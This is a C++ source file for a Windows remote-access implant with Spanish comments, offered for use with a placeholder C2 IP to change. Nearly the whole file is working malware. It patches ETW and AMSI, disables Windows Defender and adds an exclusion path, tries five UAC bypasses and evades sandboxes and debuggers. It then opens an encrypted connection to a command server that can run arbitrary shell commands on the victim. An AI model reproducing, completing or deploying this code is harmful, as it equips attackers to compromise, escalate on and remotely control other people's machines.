#define _WIN32_WINNT _WIN32_WINNT_WIN10
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <windows.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <thread>
#include <random>
#include <fstream>
#include <sstream>
#include <iostream>
#include <mutex>
#include <array>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

// ============================================================================
// CONFIGURACIÓN
// ============================================================================
#define C2_SERVER "192.168.254.137"  // CAMBIA A TU IP
#define C2_PORT 4444
#define MUTEX_NAME "Global\\WindowsUpdateMutex_{8A4E2B1C-5D6F-4A7E-9B8C}"
#define SLEEP_JITTER_MIN 30000
#define SLEEP_JITTER_MAX 120000

// ============================================================================
// TYPEDEFS PARA SYSCALLS
// ============================================================================
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, 
    PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

typedef NTSTATUS(NTAPI* pNtOpenProcess)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);

typedef NTSTATUS(NTAPI* pNtClose)(HANDLE);

// ============================================================================
// SYSCALLS DIRECTOS
// ============================================================================
class Syscalls {
private:
    pNtAllocateVirtualMemory NtAllocateVirtualMemory;
    pNtProtectVirtualMemory NtProtectVirtualMemory;
    pNtCreateThreadEx NtCreateThreadEx;
    pNtWriteVirtualMemory NtWriteVirtualMemory;
    pNtOpenProcess NtOpenProcess;
    pNtClose NtClose;
    
public:
    Syscalls() {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
        NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
        NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
        NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
        NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
        NtClose = (pNtClose)GetProcAddress(hNtdll, "NtClose");
    }
    
    NTSTATUS AllocateVirtualMemory(HANDLE h, PVOID* a, ULONG_PTR z, PSIZE_T s, ULONG t, ULONG p) {
        return NtAllocateVirtualMemory(h, a, z, s, t, p);
    }
    
    NTSTATUS ProtectVirtualMemory(HANDLE h, PVOID* a, PSIZE_T s, ULONG np, PULONG op) {
        return NtProtectVirtualMemory(h, a, s, np, op);
    }
    
    NTSTATUS CreateThreadEx(PHANDLE th, ACCESS_MASK da, POBJECT_ATTRIBUTES oa, HANDLE p, PVOID s, PVOID ar, ULONG f, SIZE_T z, SIZE_T st, SIZE_T ms, PVOID al) {
        return NtCreateThreadEx(th, da, oa, p, s, ar, f, z, st, ms, al);
    }
    
    NTSTATUS WriteVirtualMemory(HANDLE h, PVOID ba, PVOID b, SIZE_T s, PSIZE_T bw) {
        return NtWriteVirtualMemory(h, ba, b, s, bw);
    }
    
    NTSTATUS OpenProcess(PHANDLE ph, ACCESS_MASK da, POBJECT_ATTRIBUTES oa, PCLIENT_ID cid) {
        return NtOpenProcess(ph, da, oa, cid);
    }
    
    NTSTATUS Close(HANDLE h) {
        return NtClose(h);
    }
};

// ============================================================================
// BYPASS DE ETW - CORREGIDO
// ============================================================================
class ETWBypass {
private:
    Syscalls* syscalls;
    
public:
    ETWBypass(Syscalls* sc) : syscalls(sc) {}
    
    bool Patch() {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll) return false;
        
        // Parchear EtwEventWrite
        FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
        if (!pEtwEventWrite) return false;
        
        // Parchear también NtTraceEvent
        FARPROC pNtTraceEvent = GetProcAddress(hNtdll, "NtTraceEvent");
        
        SIZE_T regionSize = 32;
        PVOID address = (PVOID)pEtwEventWrite;
        ULONG oldProtect;
        
        // Cambiar protección
        syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                       PAGE_EXECUTE_READWRITE, &oldProtect);
        
        // xor eax, eax ; ret
        BYTE patch[] = { 0x31, 0xC0, 0xC3 };
        memcpy((LPVOID)pEtwEventWrite, patch, sizeof(patch));  // CAST CORREGIDO
        
        // Restaurar protección
        syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                       oldProtect, &oldProtect);
        
        // Parchear NtTraceEvent
        if (pNtTraceEvent) {
            address = (PVOID)pNtTraceEvent;
            syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                           PAGE_EXECUTE_READWRITE, &oldProtect);
            
            // mov eax, 0xC0000001 ; ret
            BYTE patch2[] = { 0xB8, 0x01, 0x00, 0x00, 0xC0, 0xC3 };
            memcpy((LPVOID)pNtTraceEvent, patch2, sizeof(patch2));  // CAST CORREGIDO
            
            syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                           oldProtect, &oldProtect);
        }
        
        return true;
    }
};

// ============================================================================
// BYPASS DE AMSI - CORREGIDO
// ============================================================================
class AMSIBypass {
private:
    Syscalls* syscalls;
    
public:
    AMSIBypass(Syscalls* sc) : syscalls(sc) {}
    
    bool Patch() {
        HMODULE hAmsi = LoadLibraryA("amsi.dll");
        if (!hAmsi) return false;
        
        FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (!pAmsiScanBuffer) return false;
        
        SIZE_T regionSize = 32;
        PVOID address = (PVOID)pAmsiScanBuffer;
        ULONG oldProtect;
        
        syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                       PAGE_EXECUTE_READWRITE, &oldProtect);
        
        BYTE patch[] = { 0x31, 0xC0, 0xC3 };
        memcpy((LPVOID)pAmsiScanBuffer, patch, sizeof(patch));  // CAST CORREGIDO
        
        syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                       oldProtect, &oldProtect);
        
        // Parchear AmsiScanString
        FARPROC pAmsiScanString = GetProcAddress(hAmsi, "AmsiScanString");
        if (pAmsiScanString) {
            address = (PVOID)pAmsiScanString;
            syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                           PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy((LPVOID)pAmsiScanString, patch, sizeof(patch));  // CAST CORREGIDO
            syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                           oldProtect, &oldProtect);
        }
        
        return true;
    }
    
    bool CorruptContext() {
        typedef HRESULT(WINAPI* AmsiInitialize_t)(LPCWSTR, PVOID*);
        HMODULE hAmsi = GetModuleHandleA("amsi.dll");
        if (!hAmsi) return false;
        
        AmsiInitialize_t AmsiInitialize = (AmsiInitialize_t)GetProcAddress(hAmsi, "AmsiInitialize");
        if (!AmsiInitialize) return false;
        
        PVOID context = nullptr;
        for (int i = 0; i < 100; i++) {
            AmsiInitialize(L"", &context);
        }
        
        return true;
    }
};

// ============================================================================
// BYPASS DE DEFENDER - CORREGIDO
// ============================================================================
class DefenderBypass {
private:
    Syscalls* syscalls;
    
public:
    DefenderBypass(Syscalls* sc) : syscalls(sc) {}
    
    bool DisableRealtime() {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
            "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 
            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            
            DWORD value = 1;
            RegSetValueExA(hKey, "DisableAntiSpyware", 0, REG_DWORD, 
                          (BYTE*)&value, sizeof(value));
            RegCloseKey(hKey);
        }
        
        // Buscar proceso de Defender
        DWORD pid = 0;
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = { sizeof(pe) };
            if (Process32First(hSnap, &pe)) {
                do {
                    if (_stricmp(pe.szExeFile, "MsMpEng.exe") == 0) {
                        pid = pe.th32ProcessID;
                        break;
                    }
                } while (Process32Next(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }
        
        if (pid) {
            HANDLE hProcess = nullptr;
            CLIENT_ID cid;
            cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;  // CAST CORREGIDO
            cid.UniqueThread = nullptr;
            
            OBJECT_ATTRIBUTES oa;
            InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);  // INICIALIZACIÓN CORRECTA
            
            if (syscalls->OpenProcess(&hProcess, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, 
                                      &oa, &cid) == 0) {
                syscalls->Close(hProcess);
            }
        }
        
        return true;
    }
    
    bool AddExclusion(const wchar_t* path) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            
            RegSetValueExW(hKey, path, 0, REG_SZ, (BYTE*)L"0", 2);
            RegCloseKey(hKey);
            return true;
        }
        return false;
    }
};

// ============================================================================
// BYPASS DE UAC (sin cambios, ya funciona)
// ============================================================================
class UACBypass {
private:
    bool IsElevated() {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
            return false;
        
        TOKEN_ELEVATION elev;
        DWORD size = sizeof(elev);
        BOOL success = GetTokenInformation(hToken, TokenElevation, &elev, size, &size);
        CloseHandle(hToken);
        
        return success && elev.TokenIsElevated;
    }
    
public:
    bool BypassAndElevate() {
        if (IsElevated()) return true;
        
        if (CmstpBypass()) return true;
        if (FodHelperBypass()) return true;
        if (EventVwrBypass()) return true;
        if (ComputerDefaultsBypass()) return true;
        if (SdcltBypass()) return true;
        
        return false;
    }
    
private:
    bool CmstpBypass() {
        wchar_t tempPath[MAX_PATH];
        GetTempPathW(MAX_PATH, tempPath);
        
        wchar_t infPath[MAX_PATH];
        swprintf(infPath, MAX_PATH, L"%s\\uac_%08X.inf", tempPath, GetTickCount());
        
        wchar_t modulePath[MAX_PATH];
        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
        
        FILE* f = _wfopen(infPath, L"w");
        if (!f) return false;
        
        fwprintf(f, L"[version]\nSignature=$chicago$\nAdvancedINF=2.5\n\n");
        fwprintf(f, L"[DefaultInstall]\n");
        fwprintf(f, L"CustomDestination=CustInstDestSectionAllUsers\n");
        fwprintf(f, L"RunPreSetupCommands=RunPreSetupCommandsSection\n\n");
        fwprintf(f, L"[RunPreSetupCommandsSection]\n");
        fwprintf(f, L"\"%s\" --elevated\n", modulePath);
        fwprintf(f, L"\n[CustInstDestSectionAllUsers]\n");
        fwprintf(f, L"49000,49001=AllUSer_LDIDSection, 7\n\n");
        fwprintf(f, L"[AllUSer_LDIDSection]\n");
        fwprintf(f, L"\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%%UnexpectedError%%\", \"\"\n\n");
        fwprintf(f, L"[Strings]\nServiceName=\"WindowsUpdate\"\nShortSvcName=\"WindowsUpdate\"\n");
        fclose(f);
        
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpVerb = L"runas";
        sei.lpFile = L"cmstp.exe";
        wchar_t args[MAX_PATH + 64];
        swprintf(args, MAX_PATH + 64, L"/au \"%s\"", infPath);
        sei.lpParameters = args;
        sei.nShow = SW_HIDE;
        
        BOOL result = ShellExecuteExW(&sei);
        Sleep(3000);
        DeleteFileW(infPath);
        
        return result && IsElevated();
    }
    
    bool FodHelperBypass() {
        wchar_t modulePath[MAX_PATH];
        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
        
        HKEY hKey;
        if (RegCreateKeyExW(HKEY_CURRENT_USER, 
            L"Software\\Classes\\ms-settings\\shell\\open\\command",
            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            
            RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)modulePath, 
                          (wcslen(modulePath) + 1) * sizeof(wchar_t));
            RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, NULL, 0);
            RegCloseKey(hKey);
            
            ShellExecuteW(NULL, L"open", L"fodhelper.exe", NULL, NULL, SW_HIDE);
            Sleep(2000);
            
            RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
            return IsElevated();
        }
        return false;
    }
    
    bool EventVwrBypass() {
        wchar_t modulePath[MAX_PATH];
        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
        
        HKEY hKey;
        if (RegCreateKeyExW(HKEY_CURRENT_USER, 
            L"Software\\Classes\\mscfile\\shell\\open\\command",
            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            
            RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)modulePath, 
                          (wcslen(modulePath) + 1) * sizeof(wchar_t));
            RegCloseKey(hKey);
            
            ShellExecuteW(NULL, L"open", L"eventvwr.exe", NULL, NULL, SW_HIDE);
            Sleep(2000);
            
            RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\mscfile");
            return IsElevated();
        }
        return false;
    }
    
    bool ComputerDefaultsBypass() {
        wchar_t modulePath[MAX_PATH];
        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
        
        HKEY hKey;
        if (RegCreateKeyExW(HKEY_CURRENT_USER, 
            L"Software\\Classes\\ComputerDefaults\\shell\\open\\command",
            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            
            RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)modulePath, 
                          (wcslen(modulePath) + 1) * sizeof(wchar_t));
            RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, NULL, 0);
            RegCloseKey(hKey);
            
            ShellExecuteW(NULL, L"open", L"computerdefaults.exe", NULL, NULL, SW_HIDE);
            Sleep(2000);
            
            RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ComputerDefaults");
            return IsElevated();
        }
        return false;
    }
    
    bool SdcltBypass() {
        wchar_t modulePath[MAX_PATH];
        GetModuleFileNameW(NULL, modulePath, MAX_PATH);
        
        HKEY hKey;
        if (RegCreateKeyExW(HKEY_CURRENT_USER, 
            L"Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe",
            0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            
            RegSetValueExW(hKey, NULL, 0, REG_SZ, (BYTE*)modulePath, 
                          (wcslen(modulePath) + 1) * sizeof(wchar_t));
            RegCloseKey(hKey);
            
            ShellExecuteW(NULL, L"open", L"sdclt.exe", L"/KickOffElevation", NULL, SW_HIDE);
            Sleep(3000);
            
            RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe");
            return IsElevated();
        }
        return false;
    }
};

// ============================================================================
// ANTI-DEBUG / ANTI-SANDBOX
// ============================================================================
class AntiAnalysis {
public:
    bool IsSandboxed() {
        int detections = 0;
        
        MEMORYSTATUSEX mem = { sizeof(mem) };
        GlobalMemoryStatusEx(&mem);
        if (mem.ullTotalPhys < 4LL * 1024 * 1024 * 1024) detections++;
        
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        if (sysInfo.dwNumberOfProcessors < 2) detections++;
        
        ULARGE_INTEGER free, total;
        GetDiskFreeSpaceExA("C:\\", &free, &total, NULL);
        if (total.QuadPart < 60LL * 1024 * 1024 * 1024) detections++;
        
        const wchar_t* sandboxProcs[] = {
            L"vboxservice.exe", L"vboxtray.exe", L"vmtoolsd.exe",
            L"vmwaretray.exe", L"xenservice.exe", L"procmon.exe",
            L"wireshark.exe", L"dumpcap.exe", L"python.exe"
        };
        
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(hSnap, &pe)) {
                do {
                    for (const auto& proc : sandboxProcs) {
                        if (_wcsicmp(pe.szExeFile, proc) == 0) {
                            detections += 2;
                            break;
                        }
                    }
                } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }
        
        if (IsDebuggerPresent()) detections += 3;
        if (GetTickCount64() < 10 * 60 * 1000) detections++;
        
        return detections >= 3;
    }
    
    void SleepRandom() {
        int baseSleep = 45000 + (rand() % 75000);
        for (int i = 0; i < baseSleep / 100; i++) {
            Sleep(100);
            if (IsDebuggerPresent()) {
                MessageBoxA(NULL, "Error de aplicación", "Error", MB_OK);
                ExitProcess(0);
            }
        }
    }
};

// ============================================================================
// COMUNICACIÓN C2 - CORREGIDO (inet_pton -> inet_addr)
// ============================================================================
class C2Connection {
private:
    SOCKET sock;
    bool connected;
    HCRYPTPROV hProv;
    BYTE key[32];
    std::mt19937_64 rng;
    
public:
    C2Connection() : sock(INVALID_SOCKET), connected(false) {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2,2), &wsa);
        
        CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
        
        std::random_device rd;
        std::array<uint64_t, 4> seed;
        for (auto& s : seed) s = rd() ^ GetTickCount64();
        std::seed_seq seq(seed.begin(), seed.end());
        rng.seed(seq);
        
        CryptGenRandom(hProv, 32, key);
    }
    
    ~C2Connection() {
        if (sock != INVALID_SOCKET) closesocket(sock);
        if (hProv) CryptReleaseContext(hProv, 0);
        WSACleanup();
    }
    
    bool Connect() {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) return false;
        
        int timeout = 10000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
        
        sockaddr_in server = {0};
        server.sin_family = AF_INET;
        server.sin_port = htons(C2_PORT);
        server.sin_addr.s_addr = inet_addr(C2_SERVER);  // CORREGIDO: inet_addr en lugar de inet_pton
        
        if (connect(sock, (sockaddr*)&server, sizeof(server)) == 0) {
            connected = true;
            return true;
        }
        
        closesocket(sock);
        return false;
    }
    
    std::string XOR(const std::string& data) {
        std::string result = data;
        for (size_t i = 0; i < data.length(); i++) {
            result[i] = data[i] ^ key[i % 32];
        }
        return result;
    }
    
    bool SendRaw(const std::string& data) {
        if (!connected) return false;
        int len = htonl(data.length());
        if (send(sock, (char*)&len, 4, 0) != 4) {
            connected = false;
            return false;
        }
        if (send(sock, data.c_str(), data.length(), 0) != (int)data.length()) {
            connected = false;
            return false;
        }
        return true;
    }
    
    bool Send(const std::string& data) {
        return SendRaw(XOR(data));
    }
    
    std::string ReceiveRaw() {
        if (!connected) return "";
        int len = 0;
        if (recv(sock, (char*)&len, 4, 0) != 4) {
            connected = false;
            return "";
        }
        len = ntohl(len);
        if (len <= 0 || len > 10 * 1024 * 1024) {
            connected = false;
            return "";
        }
        
        std::vector<char> buffer(len);
        int total = 0;
        while (total < len) {
            int r = recv(sock, buffer.data() + total, len - total, 0);
            if (r <= 0) {
                connected = false;
                return "";
            }
            total += r;
        }
        return std::string(buffer.data(), len);
    }
    
    std::string Receive() {
        std::string encrypted = ReceiveRaw();
        if (encrypted.empty()) return "";
        return XOR(encrypted);
    }
    
    bool IsConnected() { return connected; }
};

// ============================================================================
// PROCESADOR DE COMANDOS
// ============================================================================
class CommandProcessor {
private:
    C2Connection* c2;
    bool elevated;
    
    std::string ExecuteCmd(const std::string& cmd) {
        std::string result;
        char buffer[4096];
        FILE* pipe = _popen(("cmd.exe /c " + cmd).c_str(), "r");
        if (pipe) {
            while (fgets(buffer, sizeof(buffer), pipe)) {
                result += buffer;
            }
            _pclose(pipe);
        }
        return result.empty() ? "[OK]\n" : result;
    }
    
public:
    CommandProcessor(C2Connection* c) : c2(c), elevated(false) {}
    
    std::string Process(const std::string& cmd) {
        if (cmd == "INFO") {
            char host[256], user[256];
            DWORD size = sizeof(host);
            GetComputerNameA(host, &size);
            size = sizeof(user);
            GetUserNameA(user, &size);
            
            char json[512];
            snprintf(json, sizeof(json), 
                "{\"hostname\":\"%s\",\"username\":\"%s\",\"elevated\":%s}",
                host, user, elevated ? "true" : "false");
            return json;
        }
        else if (cmd == "ELEVATE") {
            UACBypass uac;
            if (uac.BypassAndElevate()) {
                elevated = true;
                return "[+] Elevado a ADMIN";
            }
            return "[-] Falló elevación";
        }
        else if (cmd.substr(0, 5) == "SHELL") {
            if (cmd.length() > 6) return ExecuteCmd(cmd.substr(6));
            return "[-] Uso: SHELL <comando>";
        }
        else if (cmd == "EXIT") {
            ExitProcess(0);
        }
        
        return "[!] Comando desconocido";
    }
};

// ============================================================================
// FUNCIÓN PRINCIPAL
// ============================================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    
    if (strstr(lpCmdLine, "--elevated") == NULL) {
        HWND hWnd = GetConsoleWindow();
        if (hWnd) ShowWindow(hWnd, SW_HIDE);
    }
    
    AntiAnalysis anti;
    if (anti.IsSandboxed()) {
        MessageBoxA(NULL, "Error al iniciar aplicación", "Error", MB_OK);
        return 0;
    }
    
    HANDLE hMutex = CreateMutexA(NULL, FALSE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
    
    Syscalls syscalls;
    
    ETWBypass etw(&syscalls);
    etw.Patch();
    
    AMSIBypass amsi(&syscalls);
    amsi.Patch();
    amsi.CorruptContext();
    
    DefenderBypass defender(&syscalls);
    defender.DisableRealtime();
    defender.AddExclusion(L"C:\\Windows\\Temp");
    
    UACBypass uac;
    bool elevated = uac.BypassAndElevate();
    
    C2Connection c2;
    CommandProcessor cmdProc(&c2);
    
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> jitter(SLEEP_JITTER_MIN, SLEEP_JITTER_MAX);
    
    while (true) {
        if (!c2.IsConnected()) {
            if (c2.Connect()) {
                c2.Send(cmdProc.Process("INFO"));
            } else {
                anti.SleepRandom();
                continue;
            }
        }
        
        std::string cmd = c2.Receive();
        if (!cmd.empty()) {
            std::string response = cmdProc.Process(cmd);
            c2.Send(response);
        }
        
        anti.SleepRandom();
    }
    
    CloseHandle(hMutex);
    return 0;
}
